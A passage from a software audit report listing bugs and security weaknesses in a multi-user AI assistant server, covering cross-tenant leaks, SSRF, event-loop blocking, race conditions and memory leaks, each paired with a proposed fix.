detail: cache_key = (disabled_tools, bool(mcp_mgr), needs_admin, _rt_key, compact, _ov_sig, suppress_local_context) but _build_base_prompt's output also depends on ui_language (apply_language appends the Spanish directive) and on mcp_disabled_map (MCP tool descriptions appended at line 1162-1164). Concrete failures: (a) a Spanish-UI user warms the cache; an English-UI user with the same tool set then receives the cached prompt containing the '## Idioma de respuesta' directive and the agent answers in Spanish (and vice versa — the es user gets English behavior); (b) the user disables an MCP tool in settings, but its description remains in the cached prompt (bool(mcp_mgr) unchanged) so the agent keeps trying to call a tool that is now rejected, until an unrelated key component changes.
fix: Include ui_language and a stable signature of mcp_disabled_map (e.g. frozenset of (server_id, frozenset(names))) — plus a version counter for MCP tool registry changes — in cache_key.

title: O(n^2) CPU and SSE bandwidth in document streaming paths
detail: Both doc-streaming paths do full-buffer rework on every delta. Native path (lines 1992-2024): for each tool_call_delta chunk, re-runs regexes over the entire accumulated _doc_acc, then json.loads-decodes the ENTIRE content-so-far, and emits a doc_stream_delta carrying the FULL decoded content (not an increment). Text-fence path (lines 2085-2115): per content delta, slices/searches round_response and re-emits the whole _rc. Concrete failure: a model generating a 200KB document in ~20-byte deltas triggers ~10,000 iterations, each decoding up to 200KB and sending up to 200KB over SSE — gigabytes of CPU work and wire traffic for one document, all executed on the event loop, degrading every concurrent stream and visibly stuttering the UI.
fix: Track the decoded length and emit only the suffix (decoded[_doc_last_len:]) as an incremental delta (the frontend appends), and decode incrementally (e.g. keep a cursor into the escaped buffer) instead of re-decoding from the start each chunk.

title: Verifier/nudge 'continue' drops the model's own round from message history
detail: When the completion verifier fails (continue at line 2257) or the intent-without-action nudge fires (continue at line 2298), the loop appends only a system note to messages — round_response (the assistant's just-streamed text, including its claimed final answer) is never appended (_append_tool_results only runs when tool_blocks exist). Concrete failure: the verifier says 'issues found, fix these'; on the next round the model has no record of what it just wrote/claimed, so it commonly regenerates a full (possibly divergent) final answer that gets concatenated after the first one in full_response — the user sees two contradictory 'final' answers in one turn.
fix: Before each continue, messages.append({'role': 'assistant', 'content': round_response}) so the follow-up round sees its own prior claim.

title: Web-sources marker extraction swallows all exceptions silently
detail: except (json.JSONDecodeError, Exception): pass — the tuple's Exception member makes this a blanket catch-and-drop around the SOURCES marker parse AND the marker-stripping writeback. Any bug there (e.g. unexpected result shape) is invisible: the raw '<!-- SOURCES: ... -->' JSON blob silently leaks into the chat output_text shown to the user and fed back to the model, with no log line to explain why source chips stopped rendering.
fix: Catch only json.JSONDecodeError and log at warning level (logger.warning with the head of the marker text) so regressions are diagnosable; the redundant Exception member should be removed.

title: Check-in digest queries calendar events with no owner scoping — cross-tenant data leak
detail: _execute_checkin pulls calendar events with `_db.query(_CE).filter(_CE.dtstart >= _s, _CE.dtstart <= _e, _CE.status != 'cancelled')` — no filter on the owning calendar. CalendarEvent has no owner column; ownership is via calendar_id -> calendars.owner (verified in core/database.py:1506), and the query joins/filters on neither. Failure scenario: in a multi-user deploy, user B's medical appointments, meeting summaries and locations are embedded in user A's check-in data dump, handed to the LLM, and delivered to user A's session/email/notification.
fix: Join through CalendarCal and filter by owner: `_db.query(_CE).join(_CE.calendar).filter(CalendarCal.owner == task.owner, _CE.dtstart >= _s, ...)` (matching the owner scoping already used for notes on line 1160).

title: _cached leaves pending future unresolved on cancellation — all waiters and future callers hang forever
detail: The owner path cleans up with `except Exception`, but asyncio.CancelledError inherits from BaseException (Python 3.8+). If the owning coroutine is cancelled while in `await fetch()` (line 55) — which stop_task() does via handle.cancel() on a running check-in, and stop() does at shutdown — the entry in _shared_cache_pending is never removed and the future is never resolved. Failure scenario: user clicks Stop on a check-in task mid-Miniflux/MCP fetch; every subsequent check-in for any owner that hits the same cache key does `await pending` on a dead future at line 53 and blocks forever, permanently wedging those scheduled tasks (they also hold _executing membership, so the scheduler never re-dispatches them).
fix: Wrap the owner branch in try/finally (or add `except BaseException`): in the cleanup, pop the key from _shared_cache_pending and, if the future is not done, call pending.cancel() (or set the exception) so waiters are released; re-raise.

title: Blocking SMTP send inside async _deliver_via_email stalls the event loop up to 30s
detail: `_send_smtp_message(cfg, from_addr, [to_addr], msg.as_string(), timeout=30)` is a synchronous smtplib call (routes/email_helpers.py:50) executed directly inside `async def _deliver_via_email`. Failure scenario: a slow/unreachable SMTP host blocks the entire event loop for up to 30 seconds — every HTTP request, websocket, the scheduler loop, and all other tasks freeze; a task with output_target=email pointed at a dead relay does this on every run.
fix: Run it off-loop: `await asyncio.to_thread(_send_smtp_message, cfg, from_addr, [to_addr], msg.as_string(), timeout=30)` (or use aiosmtplib).

title: Synchronous SQLAlchemy/SQLite queries throughout async scheduler methods block the event loop
detail: Every DB access in this file uses the sync SessionLocal directly inside coroutines: _check_due_tasks (line 605) holds the asyncio _executing_lock while running a blocking query; _execute_task_locked does ~10 sync queries/commits per run (lines 672-946); start() runs 4 full-table sweeps (354-481); the poll loop queries next_run every tick (583); _set_run_progress/_mark_run_aborted do sync commits from async contexts. Failure scenario: under SQLite write contention (busy_timeout) or a large task_runs table, each blocking call freezes the whole event loop — and because _check_due_tasks blocks while holding _executing_lock, trigger paths (run_task_now, chained runs) also serialize behind a lock held across disk I/O.
fix: Move DB work to threads (`await asyncio.to_thread(...)` around the session-scoped work) or adopt the async SQLAlchemy session; at minimum, don't perform the due-task query while holding _executing_lock — query first, then take the lock only to mutate _executing.

title: _deliver_via_mcp resolves recipient from global email config, not the task owner
detail: `cfg = _get_email_config() or {}` is called without the owner argument (signature is `_get_email_config(account_id=None, owner="")`, routes/email_helpers.py:593), so it returns the global default email account. Contrast with _deliver_via_email (line 1542) which correctly passes `owner=task.owner`. Failure scenario: in a multi-user deploy, user B's scheduled task with an mcp__* output target has its result emailed to user A's from_address (the global default account) — task output containing B's private data delivered to A's inbox.
fix: Call `_get_email_config(owner=task.owner or "")` and only fall back to the global default when the task has no owner.

title: Shared TTL cache keys for MCP snapshots and Miniflux omit the owner — cross-user result sharing
detail: The MCP snapshot cache key is `("mcp_snapshot", qualified, json.dumps(args, sort_keys=True))` and the Miniflux key is `("miniflux_unread", base_url)` (line 1207) — neither includes task.owner. Two different owners' check-ins firing within the 3-minute TTL that resolve to the same tool+args (the args are fixed pattern constants like {mailbox: INBOX, account: default}) receive the identical cached payload. Failure scenario: user A's check-in caches the unread-email snapshot; user B's check-in 60s later gets A's email subjects/senders injected into B's digest. Also, load_integrations() (line 1170) loads all integrations unscoped, so one owner's API-key-backed feeds appear in every owner's check-in.
fix: Include the owner in every cache key (e.g. `("mcp_snapshot", task.owner, qualified, ...)`) and filter load_integrations() results by owner if the registry supports it; if integrations/MCP connections are genuinely per-deployment-global, document that and gate check-in inclusion on owner match.

title: stop_task removes task from _executing while the coroutine may still be running — double execution race
detail: stop_task() calls handle.cancel() then immediately discards task_id from _executing. cancel() only schedules cancellation at the next await; if the task is inside a long synchronous section (a sync DB commit, strip_think, SMTP send) or a shielded await, it keeps running. Failure scenario: user stops an overdue task; the next scheduler tick (up to 60s later) sees the task absent from _executing with next_run still past and dispatches a second concurrent run of the same task while the first is still finishing — duplicate emails/chat messages and two TaskRun rows mutating the same ScheduledTask.
fix: Do not discard from _executing in stop_task; let _execute_task's own finally block (line 663) remove it once the coroutine has actually terminated. stop_task should only cancel the handle and mark the run aborted.

title: _last_run_model is a shared instance attribute mutated by concurrent runs — wrong model recorded
detail: The semaphore only serializes model-slot tasks; runs with bypass_model_slot=True (run_task_now force, line 1920) and non-model action tasks (line 648) execute concurrently with a semaphore-held run. Each run does `self._last_run_model = None` then reads it back at line 731 after awaiting the executor. Failure scenario: a forced LLM run resolves its model while a scheduled LLM run is between its own resolution and the read — one run's TaskRun.model records the other run's model (or None), corrupting the per-run model audit trail.
fix: Return the resolved model from _execute_llm_task/_execute_research_task (e.g. as part of a result tuple) instead of stashing it on self, or key it per run_id in a dict.

title: Expired entries in _shared_cache are never evicted
detail: _cached() writes `(deadline, val)` into the module-level _shared_cache but nothing ever deletes expired entries; they are only overwritten if the exact same key is fetched again. Keys embed base_url, tool name, and serialized args, so any churn in integrations/MCP servers/arg values leaves dead entries (including full email/RSS payload strings, up to ~3KB each) resident for the life of the process. Failure scenario: long-running server with users adding/removing integrations accumulates stale payloads indefinitely — a slow memory leak that also retains sensitive email snapshot text in memory forever.
fix: On each _cached() call (inside the lock), drop expired entries — e.g. `for k in [k for k,(exp,_) in _shared_cache.items() if exp <= now]: del _shared_cache[k]` — or cap the dict size with an LRU.

title: pop_notifications(owner=None) drains and returns every user's notification bodies
detail: When called without an owner, the method returns and clears ALL pending notifications, including `body` payloads (task results, populated for output_target='notification'). The line-341 comment shows null-owner leakage was already identified and fixed for the filtered path, but the owner=None path still bypasses that fix entirely. Failure scenario: any caller that reaches this with owner=None (an anonymous/legacy polling endpoint, or a route that passes None when auth is disabled) receives other users' task result text and simultaneously destroys their queued notifications.
fix: Make the unfiltered drain opt-in and restricted (e.g. only when a single-user/legacy flag is set), or have owner=None return only notifications whose owner is None.

title: Housekeeping task IDs are truncated UUIDs (32 bits) — collision aborts seeding silently
detail: `id=str(uuid.uuid4())[:8]` gives only 8 hex chars (~4.3B values); with 10 housekeeping tasks per owner, a few tens of thousands of owners puts primary-key collision probability in real territory. On collision, db.commit() at line 2146 raises IntegrityError, which the blanket `except Exception` at line 2147 downgrades to a warning — the entire batch of that owner's seeds/normalizations is rolled back and the owner silently never gets default tasks.
fix: Use the full uuid4 string for the primary key (as every other entity in this file does), or retry with a new id on IntegrityError.

title: Sync HTTP probe get_context_length() called on the event loop in llm_call_async and stream_llm
detail: In async def llm_call_async (line 1336) and async def stream_llm (line 1448), the ollama provider branch calls get_context_length(url, model) synchronously. That function (src/chat/model_context.py:214) performs blocking httpx.get probes (/slots, /models; REQUEST_TIMEOUT=5s each) and, for local endpoints, intentionally never caches the result ('always re-query them'). Failure scenario: every single chat request or SSE stream against a local Ollama endpoint performs 1-2 blocking HTTP GETs directly on the asyncio event loop; if the probe endpoint is slow or the host is wedged, the entire FastAPI process freezes for up to ~10s per request — all concurrent users' streams stall, heartbeats stop, and unrelated endpoints time out.
fix: In llm_call_async and stream_llm, call num_ctx = await asyncio.to_thread(get_context_length, url, model) (or add an async variant of get_context_length using the shared AsyncClient) so the probe runs off the event loop.

title: list_model_ids does blocking network + DB I/O and is invoked from async code
detail: list_model_ids uses synchronous httpx.get with timeout up to LLMConfig.DEFAULT_TIMEOUT=30s (line 1055, plus a second fallback GET at line 1070), and first runs a synchronous SQLAlchemy query via _configured_cached_model_ids (SessionLocal() at line 1005). It is called directly from async def action_test_skills (src/actions/builtin.py:1154) with no to_thread wrapper. Failure scenario: the configured endpoint is unreachable (SYN drop) — the connect hangs toward the 30s timeout twice (primary + ollama fallback), blocking the event loop for up to a minute and stalling every in-flight request in the process.
fix: Provide an async variant using the shared _get_http_client() AsyncClient, or require callers to wrap in asyncio.to_thread; at minimum use a short explicit connect timeout (httpx.Timeout(connect=3.0, ...)) like the async call paths already do.

title: LLM response cache grows without bound: unique key per full message history into a never-evicting memory region
detail: llm_call (line 1177), llm_call_async (lines 1308/1322 and 1389) write every response into llm_region, which is dogpile.cache.memory (core/cache.py:42). The memory backend never evicts expired entries — the 24h TTL only makes get() return NO_VALUE; the value stays in the dict forever. The key (_get_cache_key, line 34) hashes the entire message list, so every conversation turn / document / auto-title prompt produces a distinct SHA256 key with near-zero reuse. Failure scenario: a long-running deployment doing agent rounds and document processing accumulates one permanently-retained full response string per unique prompt; RSS grows monotonically for the process lifetime until OOM. The comment in core/cache.py ('typical usage is well under 128 entries') is not enforced anywhere.
fix: Back llm_region with a size-bounded store (e.g. cachetools.TTLCache/LRUCache via a custom dogpile backend, or dogpile's memory backend replaced with memcached/redis), or stop caching conversational calls entirely and cache only short deterministic utility prompts (title/summarize) where keys actually repeat.

title: Successful responses discarded as 502 'Unexpected schema' when cache write (or parser) raises
detail: In llm_call (lines 1169-1180) and llm_call_async (lines 1381-1392), llm_region.set(cache_key, response) and the return statement sit INSIDE the try block whose blanket 'except Exception' raises HTTPException(502, 'Unexpected schema from ...') with up to 400 chars of the response body. Failure scenario: the upstream answers successfully and parsing succeeds, but the dogpile backend raises (e.g. during a concurrent invalidate_all() from an admin reset, or any backend error) — the already-obtained response is thrown away, the caller sees a 502 blaming the provider's schema, and llm_call_with_fallback then re-sends the whole request to the next candidate, double-billing tokens. The broad except also mislabels bugs in _parse_anthropic_response/_parse_ollama_response as upstream schema errors.
fix: Narrow the try to the parse only, catching (KeyError, IndexError, TypeError); perform llm_region.set inside its own try/except that logs and continues; return the response outside both.

title: Sync llm_call lacks the dead-host cooldown its fallback docstring relies on
detail: llm_call_with_fallback's docstring (lines 1213-1214) states 'The dead-host cooldown inside llm_call makes repeat attempts at an offline primary effectively free', and the module comment at lines 66-70 claims llm_call mutates the host-health maps from the threadpool. Neither is true: llm_call (lines 1098-1180) never calls _is_host_dead/_mark_host_dead/_clear_host_dead and uses a flat timeout=30 for httpx.post covering connect. Failure scenario: the primary endpoint host is offline; every sync fallback call (e.g. /sessions/auto-sort) waits the full TCP connect timeout on the dead primary before trying the next candidate — repeatedly, since nothing marks the host dead — turning each sync LLM operation into a multi-tens-of-seconds stall, the exact problem the cooldown was built to prevent (and which the async path handles at lines 1355 and 1394).
fix: Mirror the async path in llm_call: check _is_host_dead(target_url) before posting and raise 503; use httpx.Timeout(connect=3.0, read=timeout, write=10.0, pool=5.0); call _mark_host_dead on ConnectError/ConnectTimeout and _clear_host_dead on success.

title: LLM response cache key omits owner and auth headers — cross-tenant response sharing
detail: _get_cache_key (lines 34-49) hashes only url, model, messages, temperature, and max_tokens — not the Authorization headers or the owner. Atenea is multi-user (owner_filter usage at line 1012 and owner scope guards elsewhere). Failure scenario: user A (valid paid API key) issues a prompt; user B (expired/revoked key, same endpoint URL and model) issues the byte-identical prompt within the 24h TTL and receives A's cached completion at lines 1131-1134/1277-1280 — the upstream auth check is bypassed and A's quota effectively serves B. Identical common prompts do occur (auto-title/memory-extraction templates over identical shared text).
fix: Include a stable identity component in the key — e.g. hash of the Authorization header (or the owner/endpoint_id) — in the json.dumps at line 42, or scope the cache lookup per owner.

title: Blocking network I/O (socket probes, sync httpx, sync model fetch) runs directly in async handlers
detail: _url_reachable() calls socket.create_connection() with a 0.6s timeout (line 421), _repair_unreachable_session_endpoint() calls synchronous httpx.get(..., timeout=1.5) (line 484), and _recover_empty_session_model() calls fetch_available_models(api_key) — a synchronous HTTP call to OpenAI/Codex (line 237). All three are invoked synchronously from 'async def chat_endpoint' (line 601, 606) and 'async def chat_stream' (line 789, 796) with no executor. Concrete failure: the session's endpoint host is down or firewalled (SYN dropped, so the connect waits the full timeout). Every chat send then loops over ALL enabled ModelEndpoints doing sequential blocking connects plus a 1.5s HTTP probe each — with 10 endpoints that is up to ~21 seconds during which the entire asyncio event loop is frozen: every other user's SSE stream stalls, heartbeats stop, and concurrent requests time out. Even the happy path pays one blocking connect per send.
fix: Run these probes off-loop: await asyncio.to_thread(_url_reachable, url) / asyncio.get_running_loop().run_in_executor(...), or make them properly async (asyncio.open_connection with wait_for, httpx.AsyncClient). Also probe endpoints concurrently (asyncio.gather) instead of sequentially, and cache reachability results for a few seconds.

title: /api/rewrite bypasses _enforce_chat_privileges (allowed_models + max_messages_per_day)
detail: Both /api/chat (line 615) and /api/chat_stream (line 815) call _enforce_chat_privileges(request, sess), with comments explicitly stating the gates are mirrored 'so the non-streaming path can't be used to bypass'. /api/rewrite (line 1658) performs a full stream_llm() call against sess.endpoint_url/sess.model with entirely caller-controlled prompt content (original_text and instruction come straight from the request body, lines 1670-1671, and are never checked against session history), but never calls _enforce_chat_privileges. Concrete failure: a user at their max_messages_per_day cap, or restricted to a model allowlist, POSTs /api/rewrite with arbitrary 'original_text'/'instruction' — they get unlimited, uncounted LLM completions on any model their session row points at, fully defeating the quota and allowlist enforcement the other two endpoints go out of their way to mirror.
fix: Call _enforce_chat_privileges(request, sess) in rewrite_message() right after session_manager.get_session(session_id) (after line 1681), and count the rewrite toward the daily message cap the same way chat sends are counted.

title: Synchronous SQLAlchemy/SQLite queries and commits execute inside async handlers and mid-stream in SSE generators
detail: SessionLocal() sync DB work runs on the event loop throughout: the active-document lookup in chat_stream (lines 869-933, three queries), _clear_orphaned_session_endpoint / _recover_empty_session_model / _repair_unreachable_session_endpoint (each opens a session and may commit, called per-request at lines 599-606 and 787-796), _promote_session_to_candidate committing a session-row update from inside the live SSE generator loop (lines 1287, 1464), the rewrite DB update (lines 1743-1758), and session_manager.save_sessions() after every completed stream (lines 673, 1242, 1382, 1533, 1759). Concrete failure: SQLite serializes writers with a file lock; when one request holds a write transaction (e.g. save_sessions after a long agent run), any other request hitting these code paths blocks the whole event loop for the lock-wait duration — all concurrent SSE streams stutter or stall, and heartbeat gaps cause client-side disconnects under modest multi-user load.
fix: Move DB work off-loop (await asyncio.to_thread(...) around the SessionLocal blocks, or adopt SQLAlchemy async with aiosqlite). At minimum wrap the per-request repair helpers and mid-stream commits in to_thread so streaming generators never hold the loop during a SQLite write.

title: _active_streams entry for a session is clobbered/popped by a concurrent stream on the same session
detail: stream_with_save() unconditionally overwrites _active_streams[session] (line 1040), and every completion path pops it by key only (lines 1182, 1214, 1245, 1385, 1538, 1547) with no ownership token. Concrete failure: two /api/chat_stream requests race on the same session id (double-click send, or a compare pane plus a normal send). The second request's registration replaces the first's record, so the first stream's _stream_set(partial=...) updates silently vanish (record replaced) — then whichever stream finishes first pops the OTHER stream's live record: /api/chat/stream_status returns 404 for a stream that is still running, and the 'partial-save safety net' record that motivated this dict (line 50) is lost for the still-active stream.
fix: Key the registry per stream: store a unique token in the record at registration, and make cleanup conditional (pop only if _active_streams.get(session) is this stream's record). Alternatively reject/stop a second concurrent stream for the same session before registering.

title: Malformed attachments JSON silently swallowed — message sent without the user's files
detail: In chat_stream, form-encoded attachments are parsed with 'try: att_ids = [str(x) for x in json.loads(attachments)] except Exception: pass' (lines 831-834). Concrete failure: a client sends attachments='["id1",' (truncated/invalid JSON) or a non-list JSON value; the exception is swallowed, att_ids stays [], and the message is processed as if no files were attached — the model answers without the documents, the user sees no error, and nothing is logged, making the bug undiagnosable from server logs.
fix: On parse failure raise HTTPException(400, 'Invalid attachments parameter') — or at minimum logger.warning the raw value — instead of silently proceeding without attachments.

title: /api/rewrite persists the rewrite onto the newest assistant DB row regardless of which message was rewritten
detail: The DB update selects the latest assistant message by timestamp for the session (lines 1745-1750) and overwrites its content with full_response; original_text from the request is never matched against the row. Concrete failure: the user triggers a rewrite of an older assistant bubble (or a new assistant reply lands between the rewrite request and [DONE] — possible since detached agent runs keep streaming for the same session, line 1573): the wrong, newest message is permanently overwritten in the DB with a rewrite of a different message, corrupting history. The in-memory update (lines 1734-1741) has the same 'last assistant wins' assumption.
fix: Have the client pass the target message id and filter on DBChatMessage.id == message_id (verifying it belongs to session_id); as a fallback, match the row whose content equals original_text before overwriting.

title: Synchronous multi-request GitHub download blocks the event loop in async import handler
detail: `import_skill_from_url` is `async def` but calls `fetch_skill_bundle(body.url)` directly. That function (services/memory/skill_importer.py) uses synchronous `httpx.Client` / `httpx.get` calls with 20-30s timeouts and can fetch up to MAX_FILES=64 files sequentially. One admin importing a skill bundle from a slow or throttled GitHub endpoint stalls the entire asyncio event loop for up to several minutes; every other user's request (chat, polling, everything served by this process) freezes until the download finishes or times out.
fix: Make the importer async (httpx.AsyncClient) and await it, or wrap the call: `files, _src = await asyncio.to_thread(fetch_skill_bundle, body.url.strip())`.

title: Fire-and-forget asyncio task for skill test can be garbage-collected and has no cancel/ownership path
detail: `_asyncio.create_task(_run_skill_test_job(...))` discards the returned Task. Per asyncio docs the event loop keeps only a weak reference to tasks, so the running test job can be garbage-collected mid-flight. Failure scenario: user starts a test, GC collects the task between awaits, the job dict stays `status: 'running'` forever and the UI polls /test-status indefinitely; the verdict/confidence update never happens. The audit job (line 1520-1521) correctly stores its task in the job dict; the test job does not, which also means there is no way to cancel it.
fix: Store the task in the job dict (`_skill_test_jobs[key]['task'] = task`) exactly as audit-all does at line 1521, and pop it in the coroutine's finally block.

title: _skill_test_jobs and _skill_audit_jobs grow without bound and are never evicted
detail: `_skill_test_jobs` is keyed by (owner, skill_name) and written at line 1419; entries are never deleted, expired, or capped. Each finished job retains up to 600 log entries (tool outputs up to 600 chars each), the task text, and the verdict. Over weeks of use with many users/skills this dict grows monotonically — a slow, permanent memory leak in a long-running server. `_skill_audit_jobs` (line 488) has the same never-evicted lifetime (one per owner, holding a `results` list covering every audited skill plus 1000 log lines), bounded only by user count.
fix: On job completion set a `finished` timestamp (test jobs currently do not) and evict completed jobs older than e.g. 1 hour when a new job is created or on each status poll; or use a small LRU (e.g. cap _skill_test_jobs at N entries, dropping oldest finished).

title: Blocking sync HTTP call list_model_ids() inside async handlers
detail: `list_model_ids` performs a synchronous `httpx.get` (with fallback retry to a second URL) using LLMConfig.DEFAULT_TIMEOUT. It is called directly inside `async def test_skill` (line 1409) and inside `_resolve_audit_models` (line 1010), which is invoked synchronously from `async def audit_all_skills` (line 1477) and `run_scheduled_skill_audit` (line 1046). If the model endpoint is unreachable (dropped VPN, dead local server), the whole event loop blocks for the full connect timeout — all concurrent requests hang.
fix: Wrap in a thread: `_avail = await asyncio.to_thread(list_model_ids, url, headers=headers)`, and make `_resolve_audit_models` async (or thread-wrap it at its call sites).

title: Client-controlled endpoint URL and headers used for server-side LLM calls (SSRF vector)
detail: In `test_skill`, when no default/utility model is configured, `url`, `model`, and `headers` are taken verbatim from the request body (lines 1399-1402) and then used for server-originated HTTP requests (`list_model_ids`, `stream_agent_loop`, `llm_call_async`). Any authenticated non-admin user can direct the server to POST to an arbitrary URL — including internal/link-local addresses (cloud metadata, internal admin APIs) — with fully attacker-chosen headers, and read responses back through the test transcript/judge output. Unlike /import-from-url (admin-only, GitHub-host allowlisted, checked via check_outbound_url), this path has no host validation and no admin gate.
fix: Drop the body fallback entirely (return the existing 400 when no model is configured), or validate the URL with the same `check_outbound_url` allowlist used by the skill importer and restrict the endpoint to admins.

title: Concurrent test runs for the same skill: job overwritten, old run keeps running and races on skill state
detail: POST /{skill_id}/test unconditionally overwrites `_skill_test_jobs[key]` even if a job for that skill is already running (no `status == 'running'` guard, unlike audit-all at line 1469). The first coroutine keeps running against its captured old job dict, so two agent loops execute simultaneously for the same skill; both then call `skills_manager.set_audit` and `update_skill(confidence=...)` on the same skill, and the final persisted verdict/confidence is whichever finishes last — nondeterministic, and the losing run's LLM cost is wasted. The orphaned first run also spams tool executions in parallel.
fix: Mirror the audit-all guard: if an existing job for the key has status 'running', return it (or 409) instead of overwriting; when replacement is intended, cancel the stored old task first (requires fix from the create_task finding).

title: SkillsManager.load() re-reads and re-parses every SKILL.md from disk on each call; audit loop makes it O(n²)
detail: `load()` walks the skills directory and parses every SKILL.md plus the usage sidecar on every invocation (no caching, verified in services/memory/skills.py:217). It is called synchronously inside async handlers, including the high-frequency poll endpoint `test_skill_status` (line 1435), which loads the whole library just to map skill_id to a canonical name. Inside audit-all it is worse: `_audit_one_skill` calls load() up to 4 times per skill (lines 794, 840, 863/884/910) plus `_skill_duplicate_blocker` (line 552) and `_audit_finalize_status` (line 635) each load again — roughly 6n disk-parse passes over n skills, i.e. O(n²) file reads per audit run, all blocking the event loop between awaits.
fix: Cache the parsed library keyed by directory mtime (invalidate on write), or at minimum load once per request/audit-iteration and pass the list down to the helpers; wrap remaining disk loads in handlers with asyncio.to_thread.

title: Persistence failures silently swallowed during audit finalization — reported status can diverge from disk
detail: `_audit_finalize_status` wraps `skills_manager.update_skill(name, {'status': status}, ...)` in `except Exception: pass` and then returns `status` as if it were applied; the same pattern hides failures at lines 475-483 (verdict/confidence write after a test), 641-644, 813-820, and 917-919. Failure scenario: a disk-full or permission error during the status write is discarded, the audit job log and results announce 'published — confidence 95%', but the skill on disk remains a draft with old confidence. The user has no signal anything failed and the UI shows stale success.
fix: At minimum `logger.warning` with the exception in each of these handlers, and in `_audit_finalize_status` return the actual outcome (e.g. keep the prior status or append an error to the job log) when update_skill raises or returns False.

title: Destructive-wipe guard uses OR, so a localhost port-forward to a real IMAP server bypasses it
detail: The docstring (lines 324-327) says the expunge must refuse to run unless the target is 'unmistakably the local demo account', but the guard is `USER.endswith("@atenea.local") or HOST in ("localhost", ...)`. Either signal alone passes. Concrete failure: a developer has `ssh -L 31143:imap.company.com:143` (or a docker port mapping) active and sets DEMO_IMAP_USER/PASSWORD to their real account to test connectivity; HOST is still 'localhost', so `safe_target` is True and `--reset` marks \Deleted and EXPUNGEs every message in every mailbox of the real account with no DEMO_ALLOW_WIPE confirmation. The non-standard port 31143 is itself typical of a forwarded/mapped port, making this scenario realistic.
fix: Require both conditions: `safe_target = USER.endswith("@atenea.local") and HOST in ("localhost", "127.0.0.1", "::1")` (keep the DEMO_ALLOW_WIPE=1 escape hatch for everything else).

title: STARTTLS without certificate verification sends the IMAP password over an unauthenticated channel
detail: `conn.starttls()` with no ssl_context uses imaplib's stdlib context, which does not verify the server certificate or hostname. Harmless against the default localhost Dovecot, but the script explicitly supports remote targets via DEMO_IMAP_HOST/USER/PASSWORD env overrides (and even has a DEMO_ALLOW_WIPE path for non-demo servers). Concrete failure: with DEMO_IMAP_HOST pointing at a remote host, an on-path attacker can present any certificate, complete the TLS handshake, and capture the real DEMO_IMAP_PASSWORD sent by `conn.login()` at line 60.
fix: Use `ssl.create_default_context()` when HOST is not loopback: `ctx = None if HOST in ("localhost","127.0.0.1","::1") else ssl.create_default_context(); conn.starttls(ssl_context=ctx)` (or always verify and add the local CA for the demo Dovecot).

title: APPEND/CREATE status codes ignored — script reports success even when no mail was seeded
detail: imaplib only raises on BAD/abort; a tagged NO response is returned as `typ == "NO"` without an exception. `conn.append(...)` at line 381 and `conn.create(name)` at line 318 discard the status. Concrete failure: the demo account is over quota or the Sent folder create is denied — every APPEND returns NO, nothing is stored, yet main() prints 'seeded 8 demo message(s)' and exits 0, so the operator walks on stage with an empty inbox and no error anywhere.
fix: Check the returned typ: `typ, data = conn.append(...)` and on `typ != "OK"` print the server response to stderr and return 1 (same for `conn.create` in _ensure_mailbox).

title: Next-Monday computation mixes aware UTC 'now' with naive local weekday
detail: `datetime.now(UTC) + timedelta(days=(7 - datetime.now().weekday()) % 7 or 7)` takes the weekday from naive local time but applies the offset to UTC time. Concrete failure: run at 01:00 local on Tuesday in UTC+3 (still Monday 22:00 UTC): local weekday=1 gives offset 6, landing on Sunday in UTC, so the invite body says 'Monday' and the ICS DTSTART/DTEND (line 222) actually fall on Sunday 10:00 UTC — the calendar-invite demo shows an event on the wrong day.
fix: Compute the weekday from the same aware value: `now = datetime.now(UTC); nextmon = now + timedelta(days=(7 - now.weekday()) % 7 or 7)`.

title: CPU-bound ML inference and PIL processing run directly inside async handlers, freezing the event loop
detail: Multiple 'async def' endpoints do heavy synchronous CPU work with zero offloading: Real-ESRGAN inference in denoise_image (line 1467 'upsampler.enhance') and upscale_image_local (line 1514), rembg / transformers segmentation in remove_background (lines 1580, 1584-1585), GFPGAN restoration in enhance_face (line 1651), PIL UnsharpMask in sharpen_image (line 1419), and PIL rotate+re-encode plus disk write in gallery_rotate (lines 297-313). Real-ESRGAN on a large image takes tens of seconds of pure CPU (tile=400, half=False). Because these run on the event loop thread, EVERY other request on the server (chat, SSE streams, auth) is completely stalled until inference finishes. Concrete scenario: one user clicks 'AI Upscale 4x' on a 4K photo -> the whole FastAPI app is unresponsive for 30-120s; health checks time out. Blocking file I/O compounds this: gallery_upload writes up to 100MB with img_path.write_bytes (line 161), gallery_replace (line 219), and ai_tag_image reads the whole file with read_bytes (line 1805), all on the loop.
fix: Run inference and large file I/O off the loop: 'await asyncio.get_running_loop().run_in_executor(None, _do_denoise, arr)' (or anyio.to_thread.run_sync), or declare these handlers as plain 'def' so FastAPI runs them in its threadpool. For file writes/reads use run_in_executor or aiofiles.
